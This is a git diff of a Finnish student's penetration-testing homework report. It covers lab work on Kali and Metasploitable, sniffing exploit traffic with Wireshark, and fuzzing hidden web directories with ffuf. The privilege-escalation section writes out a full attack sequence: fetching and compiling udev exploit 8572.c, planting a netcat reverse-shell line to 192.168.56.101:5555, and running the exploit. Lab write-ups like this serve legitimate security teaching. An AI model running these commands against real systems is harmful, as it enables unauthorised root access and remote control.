@@ -30,8 +30,36 @@ Ilmoituksena tuli, että exploit suoritettu, sessiota ei luotu. Katsoin ``show o
 
 ![image](https://github.com/user-attachments/assets/552fe8f1-b26f-4f6b-afc1-3bd457a3b2ca)
 
-ps aux
+Miten pääsisin rootiin? Etsin Youtubesta ohjevideon https://www.youtube.com/watch?v=DoUZFHwZntY.
+
+ps aux 
 dpkg -l |grep "udev"
+Kalilla searchsploit udev
+sudo systemctl start apache2
+sudo cp /usr/share/exploitdb/exploits/linux/local/8572.c /var/www/html
+cd /var/www/html/
+ls
+
+Metasploitablessa daemonina:
+sudo wget 192.168.56.101/8572.c -O msp2.c
+ls
+touch run
+ls
+echo '#½/bin/sh' > run
+echo '/bin/netcat -e /bin/sh 192.168.56.101 5555' >> run
+cat run
+gcc msp2.c -o msp2
+ls
+cat /proc/net/netlink Pid: 2406
+
+Kalilla:
+nc -lvnp 5555
+
+Metasploitablessa:
+chmod +x msp2
+./msp2 2406
+
+![image](https://github.com/user-attachments/assets/aef6919d-3b21-462e-84f5-3cf9b7b0145e)
 
 
 
@@ -193,8 +221,53 @@ end
 
 ## c) Snif snif. Selitä ja arvioi valitsemasi hyökkäyksen toimintaa verkkosnifferillä. Pohdi myös, miten näkyvä tämä hyökkäys tai kontrollikanava on verkossa. (Vapaaehtoinen bonus: liitä mukaan pcap tekemästäsi nauhoituksesta).
 
+Avasin Wiresharkin komennolla ``wireshark``. Toisella välilehdellä laitoin exploitin valmiiksi. Valitsin Wiresharkista sen verkon, jossa Kali ja Metasploitable on kaksoisklikkaamalla eth1.
+
+![image](https://github.com/user-attachments/assets/517dc04f-6102-4325-8bc0-94e4ee79d8d8)
+
+Suoritin exploitin run-komennolla, ja Wireshark nappasi verkkoliikennettä näiden koneiden välillä.
+
+![image](https://github.com/user-attachments/assets/2ce65247-fd8e-41b6-a49e-8b85ad0af29f)
+
+![image](https://github.com/user-attachments/assets/c812133e-34af-4abe-a0b4-a889ae930e7c)
+
+
+
+
 
 ## d) Fuzzzz. Ratkaise dirfuz-1 artikkelista Karvinen 2023: Find Hidden Web Directories - Fuzz URLs with ffuf.
+
+Latasin sivulta [https://terokarvinen.com/2023/fuzz-urls-find-hidden-directories/](https://terokarvinen.com/2023/fuzz-urls-find-hidden-directories/) targetin ja säädin käyttöoikeuksia ohjeen mukaan.
+
+![image](https://github.com/user-attachments/assets/f59b9b07-0536-4de0-9aa4-554c023b73da)
+
+Selaimessa näytti tältä, eli targetti oli nyt kunnossa.
+
+![image](https://github.com/user-attachments/assets/1f04bd5b-1c22-48c7-8ac7-af2aab0ff938)
+
+Seuraavaksi asensin ffufin.
+
+![image](https://github.com/user-attachments/assets/5286f0ed-e464-462b-9b83-512515df6e44)
+
+Sitten latasin sanakirjatiedoston common.txt.
+
+![image](https://github.com/user-attachments/assets/5fa17a29-6c4f-4802-aa7b-79433ada9473)
+
+Kokeilin ffufia, tuloksia oli piiiitkä lista.
+
+![image](https://github.com/user-attachments/assets/a29ba838-5f0c-44d4-8788-bfd0dae30b37)
+
+
+Ohjeissa oli vinkkejä suodattamiseen, ja sain haaviin kohdeosoitteen.
+
+![image](https://github.com/user-attachments/assets/d88f73da-ef6b-4fc5-ac3f-39411d973634)
+
+Selaimessa:
+
+![image](https://github.com/user-attachments/assets/7a77af2c-76ca-4a27-80e3-52ee80083d16)
+
+
+
 
 
 ## d) HTB. Ratkaise 1-2 konetta HackTheBoxisssa. Voit valita omaan taitotasoon sopivat koneet.
@@ -208,6 +281,8 @@ end
 https://www.computersecuritystudent.com/SECURITY_TOOLS/METASPLOITABLE/EXPLOIT/lesson2/index.html
 
 https://dev.to/atenadadkhah/hack-metasploitable-machine-in-5-ways-using-kali-linux-2h9e
+
+https://www.youtube.com/watch?v=DoUZFHwZntY
 
 
 https://dev.to/atenadadkhah/hack-metasploitable-machine-in-5-ways-using-kali-linux-2h9e
